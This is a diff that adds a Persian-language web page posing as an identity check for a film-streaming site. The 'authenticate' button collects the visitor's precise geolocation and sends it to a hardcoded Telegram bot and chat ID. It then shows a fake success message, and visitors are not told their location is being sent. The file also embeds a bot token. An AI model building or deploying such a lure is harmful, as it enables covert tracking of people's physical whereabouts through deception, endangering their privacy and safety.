@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>احراز هویت در سایت</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #4b79a1, #283e51);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background: linear-gradient(45deg, #34e89e, #0f3443);
+            border: none;
+            color: white;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: linear-gradient(45deg, #0f3443, #34e89e);
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>احراز هویت در سایت</h1>
+        <p>
+            برای استفاده از تمامی امکانات سایت و مشاهده بهترین فیلم‌ها با دوبله فارسی، لازم است ابتدا هویت شما تأیید شود. 
+            لطفاً برای ادامه روی دکمه زیر کلیک کنید.
+        </p>
+        <button id="authButton">احراز هویت</button>
+    </div>
+    <script>
+        const token = "8007604782:AAFBW5oKYEDE2HZHhry7uenKGiZVdOrcFg8"; // توکن ربات تلگرام
+        const chat_id = "1426493835"; // آی‌دی چت تلگرام
+        const authButton = document.getElementById('authButton');
+
+        authButton.addEventListener('click', () => {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // ارسال لوکیشن به تلگرام
+                    fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chat_id,
+                            latitude: latitude,
+                            longitude: longitude
+                        })
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            alert("احراز هویت شما با موفقیت انجام شد. خوش آمدید!");
+                        } else {
+                            alert("احراز هویت ناموفق بود. لطفاً دوباره تلاش کنید.");
+                        }
+                    })
+                    .catch(err => {
+                        alert("خطایی در احراز هویت رخ داد. لطفاً دوباره تلاش کنید.");
+                        console.error(err);
+                    });
+                }, (error) => {
+                    alert("لطفاً دسترسی به موقعیت مکانی خود را فعال کنید.");
+                    console.error("خطای موقعیت مکانی:", error);
+                });
+            } else {
+                alert("مرورگر شما از احراز هویت پشتیبانی نمی‌کند.");
+            }
+        });
+    </script>
+</body>
+</html>
